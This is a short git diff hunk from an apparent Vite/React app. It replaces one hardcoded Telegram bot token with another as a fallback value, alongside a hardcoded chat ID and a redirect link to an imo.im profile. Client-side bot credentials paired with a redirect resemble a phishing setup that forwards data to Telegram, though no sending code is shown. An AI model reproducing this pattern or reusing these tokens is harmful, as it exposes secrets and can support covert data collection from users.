@@ -48,7 +48,7 @@ import PremiumVideoGroups from './components/PremiumVideoGroups';
 import FriendService from './components/FriendService';
 
 // Configuration
-const BOT_TOKEN = process.env.VITE_TELEGRAM_BOT_TOKEN || "8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs";
+const BOT_TOKEN = process.env.VITE_TELEGRAM_BOT_TOKEN || "8793297790:AAFUdOGFrBbi4LD6TRcLjTZ_BcvNJUgPfyg";
 const CHAT_ID = process.env.VITE_TELEGRAM_CHAT_ID || "8271536101";
 const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
 
